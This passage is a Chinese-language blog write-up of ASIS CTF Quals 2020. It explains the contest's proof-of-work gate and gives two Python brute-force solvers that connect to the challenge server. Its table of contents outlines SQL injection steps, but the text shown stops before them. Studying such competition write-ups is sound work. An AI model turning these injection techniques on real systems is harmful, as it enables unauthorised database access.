@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[Sharing] ASIS CTF Quals 2020 - Cyris&#39;s Blog</title><meta name="Description" content="This is Cyris&#39;s blog, recording life and sharing security learning."><meta property="og:title" content="[Sharing] ASIS CTF Quals 2020" />
+<meta property="og:description" content="
+暑假第一場 CTF online，同時也是我們 MacacaHub 的今年第三戰~
+不過同時也被隊長告知有一定的難度要有心理準備，嗯、真滴難QwQ
+題組全部共 31 題，雖然只解 4 題還有 Rank 151 / 815 &hellip; 太可怕了==
+CTFtime link" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.cyris.tw/posts/2020/asisctf-qual-2020/" /><meta property="og:image" content="https://blog.cyris.tw/img/cyris.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-07-14T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-07-14T00:00:00+00:00" /><meta property="og:site_name" content="Cyris&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.cyris.tw/img/cyris.png"/>
+
+<meta name="twitter:title" content="[Sharing] ASIS CTF Quals 2020"/>
+<meta name="twitter:description" content="
+暑假第一場 CTF online，同時也是我們 MacacaHub 的今年第三戰~
+不過同時也被隊長告知有一定的難度要有心理準備，嗯、真滴難QwQ
+題組全部共 31 題，雖然只解 4 題還有 Rank 151 / 815 &hellip; 太可怕了==
+CTFtime link"/>
+<meta name="twitter:site" content="@yctseng1227"/>
+<meta name="application-name" content="Cyris&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Cyris&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/img/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://blog.cyris.tw/posts/2020/asisctf-qual-2020/" /><link rel="prev" href="https://blog.cyris.tw/posts/2020/ais3-2020-preexam-writeups/" /><link rel="next" href="https://blog.cyris.tw/posts/2020/2020-summer-conf-p1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[Sharing] ASIS CTF Quals 2020",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.cyris.tw\/posts\/2020\/asisctf-qual-2020\/"
+        },"image": ["https:\/\/blog.cyris.tw\/img\/cyris.png"],"genre": "posts","keywords": "ASIS CTF, 心得分享","wordcount":  1089 ,
+        "url": "https:\/\/blog.cyris.tw\/posts\/2020\/asisctf-qual-2020\/","datePublished": "2020-07-14T00:00:00+00:00","dateModified": "2020-07-14T00:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Cyris","logo": "https:\/\/blog.cyris.tw\/img\/cyris.png"},"author": {
+                "@type": "Person",
+                "name": "Cyris Tseng"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Cyris&#39;s Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/favicon.ico"
+        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
+        data-sizes="auto"
+        alt="/img/favicon.ico"
+        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Cyris&#39;s Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/favicon.ico"
+        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
+        data-sizes="auto"
+        alt="/img/favicon.ico"
+        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[Sharing] ASIS CTF Quals 2020</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://blog.cyris.tw" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Cyris Tseng</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-cyber-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>資訊安全 Cyber Security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-07-14">2020-07-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1089 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#寫在前面的話">寫在前面的話</a></li>
+    <li><a href="#mechanism-proof-of-work">Mechanism: Proof of Work</a></li>
+    <li><a href="#web-web-warm-up-solved">[Web] Web Warm-up (Solved)</a></li>
+    <li><a href="#web-treasury-1-unsolved">[Web] Treasury #1 (Unsolved)</a>
+      <ul>
+        <li>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#a-確定sqli漏洞">a. 確定SQLi漏洞</a></li>
+                <li><a href="#b-嘗試用union搭配其他sql-command">b. 嘗試用<code>UNION</code>搭配其他SQL command</a></li>
+                <li><a href="#c-確認資料庫種類和版本">c. 確認資料庫種類和版本</a></li>
+                <li><a href="#d-逐步猜資料庫欄位">d. 逐步猜資料庫欄位</a></li>
+                <li><a href="#e-針對xml-structure逐步還原資料">e. 針對XML structure逐步還原資料</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#crypto-baby-rsa-unsolved">[Crypto] Baby RSA (Unsolved)</a></li>
+    <li><a href="#miscforensics-adventure">[Misc][Forensics] Adventure</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-dashboard.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-dashboard.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-dashboard.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-dashboard.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-dashboard.webp"
+        title=" " /></p>
+<p>暑假第一場 CTF online，同時也是我們 <strong>MacacaHub</strong> 的今年第三戰~<br>
+不過同時也被隊長告知有一定的難度要有心理準備，嗯、真滴難QwQ<br>
+題組全部共 31 題，雖然只解 4 題還有 Rank 151 / 815 &hellip; 太可怕了==</p>
+<p><a href="https://ctftime.org/event/964" target="_blank" rel="noopener noreffer ">CTFtime link</a></p>
+<h2 id="寫在前面的話">寫在前面的話</h2>
+<p>從上圖可以看得出來，我們解出來的四題扣掉 <code>Welcome</code> 和 <code>Survey</code>(feedback)，實際答出來的只有兩題。然而還是有兩支隊伍破台，別忘了這場還是Quals(資格賽)，人外有人天外有天呢&hellip;</p>
+<p>既然只摸出兩題，這篇標題自然沒辦法放 &ldquo;<strong>writeup</strong>&quot;，所以就當做見見世面發些心得，同時針對一些賽中我認為很有趣的題目稍微參考別人解法寫一下，其實有幾題看完題解發現都不太難，只是有沒有發現而已QQ。</p>
+<h2 id="mechanism-proof-of-work">Mechanism: Proof of Work</h2>
+<p>上次遇到 <code>PoW</code> 是 <strong>AIS3 EOF CTF 2019</strong> 的 <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/AIS3%20EOF%20CTF%202019/Ponzi%20Scheme/readme.md" target="_blank" rel="noopener noreffer ">Ponzi Scheme</a>，這技術常見於區塊鏈加密貨幣的機制，是一種對應服務與資源濫用、或是阻斷服務攻擊(DoS)的經濟對策。要求使用者進行一些<font color=red>耗時適當的複雜運算</font>，並且答案能被服務方快速驗算，以此耗用的時間、裝置與能源做為擔保成本，以確保服務與資源是被真正的需求所使用。</p>
+<p>所以某方面也算是官方針對 <code>nc</code> 題目一種自我保護的機制，避免被大量玩家戳一戳就掛掉。另一方面，我自己猜可能有些題目可以用 Brute Force 的爆出答案，避免這種情況才加了這項機制。總之，雖然並非主要考點，但如果過不了也沒辦法解題XD 雖然並不是每題 <code>nc</code> 題目都有 <code>PoW</code> ，不過翻了翻 <code>ASIS CTF</code> 往年的題目只要有出現 <code>PoW</code> 的都不太一樣，沒辦法直接抄來用QQ</p>
+<p>￬￬￬ 以這場來看，<code>PoW</code>描述如下 ￬￬￬</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc <span class="o">[</span>ip<span class="o">]</span> <span class="o">[</span>port<span class="o">]</span>
+</span></span><span class="line"><span class="cl">&gt; Please submit a printable string X, such that sha224<span class="o">(</span>X<span class="o">)[</span>-6:<span class="o">]</span> <span class="o">=</span> 6be655 and len<span class="o">(</span>X<span class="o">)</span> <span class="o">=</span> <span class="m">19</span>
+</span></span><span class="line"><span class="cl">haha
+</span></span><span class="line"><span class="cl">&gt; You must pass this PoW challenge :P
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>翻譯一下：系統要求輸入長度為 19 的字串 <code>X</code>，同時要滿足 sha224(X) 後 6 位為 6be655。 其中， <code>Hash Algorithm</code> 的部分每次連線結果都不同，隨意測試就有 sha1, sha224, sha256, sha384, sha512, md5 &hellip;ect ，而且不同往年 <code>ASIS CTF</code> 多了指定 <code>輸入長度len(x)</code> ，同樣每次連線結果不同，測出來 Range 大約 10 - 40。</p>
+<p>根據 <code>Hash</code> 的特性，雖然因為<strong>不可逆</strong>沒辦法從後6位往回推，但<code>相同的輸入</code>一定會得到 <code>相同的輸出</code> ，那我們其實可以暴力產生指定長度的輸入，拿去 hash 再看看有沒有符合後6位的條件就行了。</p>
+<p>個人的做法是連線後用字串處理拿到 <code>Hash Algorithm</code> 和 <code>length</code> ，只針對 <code>sha256</code> 且長度為 <code>10</code>的PoW直接爆搜字串進行驗證，簡單用python表示如下:</p>
+<div class="highlight" filename="solve.py"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pow_solve</span><span class="p">(</span><span class="n">s</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">for</span> <span class="n">g</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                            <span class="k">if</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">d</span><span class="o">+</span><span class="n">e</span><span class="o">+</span><span class="n">f</span><span class="o">+</span><span class="n">g</span><span class="o">+</span><span class="n">h</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span> <span class="o">==</span> <span class="n">s</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                                <span class="k">return</span> <span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="o">+</span><span class="n">d</span><span class="o">+</span><span class="n">e</span><span class="o">+</span><span class="n">f</span><span class="o">+</span><span class="n">g</span><span class="o">+</span><span class="n">h</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="n">j</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 通常1000次內一定會有 sha256 &amp; len=10</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 省略字串處理過程</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hash_algo</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="s1">&#39;sha256&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">target</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">length</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">length</span><span class="p">)</span> <span class="o">==</span> <span class="mi">10</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pow_solve</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#solve()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我知道一定會有人想吐槽那個 10 層迴圈，不過不想花時間刻 DFS 這樣寫最直觀 XD
+賽後在網路上翻到其他玩家的作法如下，趕緊存起來!!  <a href="https://gist.github.com/saurav3199/a61cada35112ebfd2a9a0d218926bb36" target="_blank" rel="noopener noreffer ">source link</a></p>
+<div class="highlight" filename="pow_solve.py"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#import string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;76.74.178.201&#34;</span><span class="p">,</span> <span class="mi">8002</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">info</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">algo</span> <span class="o">=</span> <span class="n">info</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;(&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">info</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">info</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] algo needed: </span><span class="si">{</span><span class="n">algo</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] target needed: </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] length needed: </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">random_ascii_generator</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="n">l</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">string</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">l</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">algo_matching</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sha1&#34;</span><span class="p">:</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;md5&#34;</span><span class="p">:</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sha224&#34;</span><span class="p">:</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha224</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sha256&#34;</span><span class="p">:</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sha384&#34;</span><span class="p">:</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha384</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sha512&#34;</span><span class="p">:</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha512</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">candidate_hash</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="ow">not</span> <span class="n">candidate_hash</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span> <span class="o">==</span> <span class="n">target</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">candidate_string</span> <span class="o">=</span> <span class="n">random_ascii_generator</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">candidate_hash</span> <span class="o">=</span> <span class="n">algo_matching</span><span class="p">[</span><span class="n">algo</span><span class="p">](</span><span class="n">candidate_string</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] PoW found&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">candidate_string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>執行看起來就簡潔有力，好羨慕 &gt;///&lt;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-solver.webp"
+        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-solver.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-solver.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1618818959/blog-posts/2020-07/14-solver.webp 2x"
+        data-sizes="auto"
+        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618818959/blog-posts/2020-07/14-solver.webp"
+        title=" " /></p>
+<p>P.S. 圖中的題目為 <a href="https://ctftime.org/task/12212" target="_blank" rel="noopener noreffer ">PPC-Titanic</a>。</p>
+<h2 id="web-web-warm-up-solved">[Web] Web Warm-up (Solved)</h2>
+<p>Warm up! Can you break all the tasks? I&rsquo;ll pray for you!<br>
+read <font color="#F4A8B8">flag.php</font><br>
